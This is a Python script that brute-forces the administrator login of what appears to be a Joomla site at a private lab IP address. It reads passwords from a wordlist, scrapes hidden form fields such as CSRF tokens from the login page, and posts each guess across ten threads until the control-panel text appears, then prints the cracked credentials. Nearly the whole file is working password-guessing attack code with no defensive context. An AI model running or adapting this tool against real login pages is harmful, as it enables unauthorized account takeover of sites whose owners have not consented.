import threading
import queue
import requests
import sys
from html.parser import HTMLParser
import os

# === Configuration ===
user_thread = 10
username = "admin"
wordlist_file = "/tmp/cain.txt"
resume = None

# Target settings
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"
username_field = "username"
password_field = "passwd"
success_check = "Administration - Control Panel"


# === HTML Parser ===
class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = ""
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                elif name == "value":
                    tag_value = value
            if tag_name:
                self.tag_results[tag_name] = tag_value


# === Brute Forcer ===
class Bruter:
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print(f"[*] Finished setting up for: {username}")

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter, name=f"Thread-{i}")
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().strip()

            session = requests.Session()
            try:
                response = session.get(target_url, timeout=10)
                parser = BruteParser()
                parser.feed(response.text)
                post_data = parser.tag_results

                post_data[username_field] = self.username
                post_data[password_field] = brute

                print(f"[*] Trying: {self.username}:{brute} ({self.password_q.qsize()} left)")
                login_response = session.post(target_post, data=post_data)

                if success_check in login_response.text:
                    self.found = True
                    print("\n[✓] Brute-force successful!")
                    print(f"[*] Username: {self.username}")
                    print(f"[*] Password: {brute}")
                    print("[*] Waiting for other threads to exit...\n")
            except requests.RequestException as e:
                print(f"[!] Request failed: {e}")
            except Exception as e:
                print(f"[!] Unexpected error: {e}")


# === Wordlist Builder ===
def build_wordlist(filepath):
    if not os.path.exists(filepath):
        print(f"[!] Wordlist file not found: {filepath}")
        sys.exit(1)

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        raw_words = f.read().splitlines()

    words = queue.Queue()
    found_resume = resume is None

    for word in raw_words:
        word = word.strip()
        if not word:
            continue

        if found_resume:
            words.put(word)
        elif word == resume:
            found_resume = True
            print(f"[*] Resuming wordlist from: {resume}")
            words.put(word)

    return words


# === Main Execution ===
if __name__ == "__main__":
    words = build_wordlist(wordlist_file)
    bruter = Bruter(username, words)
    bruter.run_bruteforce()
